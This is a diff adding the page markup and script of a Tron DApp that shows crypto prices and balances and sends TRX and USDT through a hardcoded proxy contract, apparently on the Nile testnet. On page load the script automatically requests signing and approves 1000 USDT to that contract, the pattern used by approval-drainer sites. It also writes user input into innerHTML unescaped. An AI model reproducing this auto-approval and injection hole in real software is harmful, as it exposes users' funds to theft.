@@ -108,4 +108,192 @@
         }
         @keyframes pulse {
             0% { opacity: 1; }
-            50
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        @media (max-width: 600px) {
+            h1 { font-size: 2em; }
+            h2 { font-size: 1.5em; }
+            button, input { width: 100%; max-width: none; }
+            .price-item { flex: 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome to My Tron DApp</h1>
+        <button onclick="connectWallet()">连接 TronLink</button>
+        <p id="status">未连接</p>
+
+        <h2>实时加密货币价格</h2>
+        <div class="card price-card" id="priceList">
+            <div class="price-item">BTC: 加载中...</div>
+            <div class="price-item">ETH: 加载中...</div>
+            <div class="price-item">TRX: 加载中...</div>
+        </div>
+
+        <h2>余额</h2>
+        <div class="card">
+            <p id="balance">TRX 余额: 未查询</p>
+            <p id="trc20Balance">USDT 余额: 未查询</p>
+            <button onclick="updateBalances()">刷新余额</button>
+        </div>
+
+        <h2>通过代理转移 TRX 和 USDT</h2>
+        <div class="card">
+            <input id="toAddress" placeholder="接收地址">
+            <input id="trxAmount" placeholder="TRX 金额" type="number">
+            <input id="usdtAmount" placeholder="USDT 金额" type="number">
+            <button onclick="transferViaProxy()">转移代币</button>
+            <p id="txStatus">交易状态: 未发送</p>
+            <p id="loading" class="loading">处理中，请稍候...</p>
+        </div>
+
+        <h2>交易历史</h2>
+        <div id="history"></div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+    <script>
+        let tronWeb;
+        const proxyContractAddress = "TNviKUTKpzuYy6TnGZ3KMp63rkiojuHEXn"; // 代理合约地址
+        const usdtAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // Nile 测试网 USDT 地址
+        let isAuthorized = false;
+        let history = [];
+
+        // 获取实时价格
+        async function fetchCryptoPrices() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tron&vs_currencies=usd');
+                const data = await response.json();
+                document.getElementById("priceList").innerHTML = `
+                    <div class="price-item">BTC: $${data.bitcoin.usd}</div>
+                    <div class="price-item">ETH: $${data.ethereum.usd}</div>
+                    <div class="price-item">TRX: $${data.tron.usd}</div>
+                `;
+            } catch (error) {
+                document.getElementById("priceList").innerHTML = `<div class="price-item">价格加载失败</div>`;
+            }
+        }
+
+        // 每 5 秒更新一次价格
+        setInterval(fetchCryptoPrices, 5000);
+
+        async function connectWallet() {
+            if (window.tronWeb && window.tronWeb.defaultAddress) {
+                try {
+                    // 请求用户授权发送交易
+                    await window.tronWeb.request({
+                        method: 'tron_requestAccounts',
+                        params: {
+                            permissions: ['sendTransaction'] // 请求发送交易权限
+                        }
+                    });
+                    tronWeb = window.tronWeb;
+                    const address = tronWeb.defaultAddress.base58;
+                    document.getElementById("status").innerText = `已连接: ${address}`;
+                    await authorize(); // 执行授权逻辑
+                    await updateBalances(); // 更新余额
+                } catch (error) {
+                    document.getElementById("status").innerText = "连接失败: " + error.message;
+                }
+            } else {
+                document.getElementById("status").innerText = "请安装 TronLink 并登录";
+            }
+        }
+
+        async function authorize() {
+            if (isAuthorized) return;
+            try {
+                const message = "授权 DApp 代理转移代币";
+                const signature = await tronWeb.trx.sign(tronWeb.toHex(message));
+                console.log("签名完成:", signature);
+
+                const contract = await tronWeb.contract().at(usdtAddress);
+                const amountInUnits = 1000000000; // 授权 1000 USDT
+                await contract.approve(proxyContractAddress, amountInUnits).send();
+                console.log("USDT 授权成功");
+                isAuthorized = true;
+            } catch (error) {
+                document.getElementById("status").innerText = "授权失败: " + error.message;
+                throw error;
+            }
+        }
+
+        async function updateBalances() {
+            if (!tronWeb) return;
+            try {
+                const address = tronWeb.defaultAddress.base58;
+                const balanceInSun = await tronWeb.trx.getBalance(address);
+                const balanceInTRX = tronWeb.fromSun(balanceInSun);
+                document.getElementById("balance").innerText = `TRX 余额: ${balanceInTRX} TRX`;
+
+                const contract = await tronWeb.contract().at(usdtAddress);
+                const balance = await contract.balanceOf(address).call();
+                const balanceInUSDT = balance / 1e6;
+                document.getElementById("trc20Balance").innerText = `USDT 余额: ${balanceInUSDT} USDT`;
+            } catch (error) {
+                console.log("查询余额失败:", error.message);
+            }
+        }
+
+        async function transferViaProxy() {
+            if (!tronWeb) {
+                alert("请先连接 TronLink");
+                return;
+            }
+            if (!isAuthorized) {
+                alert("请先完成授权");
+                return;
+            }
+            const toAddress = document.getElementById("toAddress").value;
+            const trxAmount = document.getElementById("trxAmount").value;
+            const usdtAmount = document.getElementById("usdtAmount").value;
+            if (!toAddress || (!trxAmount && !usdtAmount)) {
+                alert("请输入接收地址和至少一种代币金额");
+                return;
+            }
+            document.getElementById("loading").style.display = "block";
+            try {
+                const contract = await tronWeb.contract().at(proxyContractAddress);
+                let statusMessage = "";
+                let txId = "";
+                if (trxAmount) {
+                    const amountInSun = tronWeb.toSun(trxAmount);
+                    const tx = await contract.transferTRX(toAddress, amountInSun).send();
+                    txId = tx;
+                    statusMessage += `TRX 转移成功: ${trxAmount} TRX`;
+                }
+                if (usdtAmount) {
+                    const amountInUnits = usdtAmount * 1e6;
+                    const tx = await contract.transferUSDT(usdtAddress, toAddress, amountInUnits).send();
+                    txId = tx;
+                    statusMessage += statusMessage ? " | " : "";
+                    statusMessage += `USDT 转移成功: ${usdtAmount} USDT`;
+                }
+                document.getElementById("txStatus").innerText = statusMessage;
+
+                const historyEntry = `${new Date().toLocaleString()}: 转移到 ${toAddress} - ${statusMessage} <a href="https://nile.tronscan.org/#/transaction/${txId}" target="_blank">查看交易</a>`;
+                history.push(historyEntry);
+                updateHistory();
+
+                await updateBalances();
+            } catch (error) {
+                document.getElementById("txStatus").innerText = "转移失败: " + error.message;
+            } finally {
+                document.getElementById("loading").style.display = "none";
+            }
+        }
+
+        function updateHistory() {
+            const historyDiv = document.getElementById("history");
+            historyDiv.innerHTML = history.map(entry => `<div class="history-item">${entry}</div>`).join("");
+        }
+
+        window.onload = function() {
+            fetchCryptoPrices();
+            setTimeout(connectWallet, 2000);
+        };
+    </script>
+</body>
+</html>
